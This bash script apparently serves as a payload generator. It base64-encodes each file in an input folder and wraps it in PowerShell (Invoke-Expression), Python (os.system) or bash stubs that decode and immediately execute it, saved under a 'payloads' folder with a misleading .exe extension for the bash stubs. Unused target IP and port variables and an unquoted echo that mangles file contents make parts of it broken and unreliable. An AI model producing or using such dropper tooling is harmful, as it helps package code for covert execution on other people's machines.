#!/bin/bash

# Set the target IP and port
target_ip="192.168.1.1"
target_port="80"

# Set the input file directory
input_dir="./input"

# Set the output directory
output_dir="./payloads"

# Set the payload name and extension
payload_name="payload"
payload_ext="exe"

# Create the output directory if it doesn't exist
if [ ! -d "$output_dir" ]; then
  mkdir -p "$output_dir"
fi

# Loop through each file in the input directory
for file in $input_dir/*; do
  echo "Processing file: $file"
  # Read the contents of the file
  file_contents=$(cat "$file")
  # Encode the file contents using Base64
  file_encoded=$(echo $file_contents | base64)
  # Get the file extension
  file_ext="${file##*.}"
  # Generate a download and execute file
  echo "Generating download and execute file..."
  if [ "$file_ext" == "ps1" ]; then
    de_file="$output_dir/$(basename "$file" .ps1)_download_execute.ps1"
    echo "# Download and execute $(basename "$file")" > "$de_file"
    echo "\$payload = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('$file_encoded'))" >> "$de_file"
    echo "Invoke-Expression \$payload" >> "$de_file"
  elif [ "$file_ext" == "py" ]; then
    de_file="$output_dir/$(basename "$file" .py)_download_execute.py"
    echo "# Download and execute $(basename "$file")" > "$de_file"
    echo "import base64" >> "$de_file"
    echo "import os" >> "$de_file"
    echo "payload = base64.b64decode('$file_encoded')" >> "$de_file"
    echo "with open('$(basename "$file")', 'wb') as f:" >> "$de_file"
    echo "  f.write(payload)" >> "$de_file"
    echo "os.system('python $(basename "$file")')" >> "$de_file"
  else
    de_file="$output_dir/$(basename "$file")_download_execute.$payload_ext"
    echo "#!/bin/bash" > "$de_file"
    echo "# Download and execute $(basename "$file")" >> "$de_file"
    echo "echo '$file_encoded' | base64 -d > $(basename "$file")" >> "$de_file"
    echo "chmod +x $(basename "$file")" >> "$de_file"
    echo "./$(basename "$file")" >> "$de_file"
  fi
done
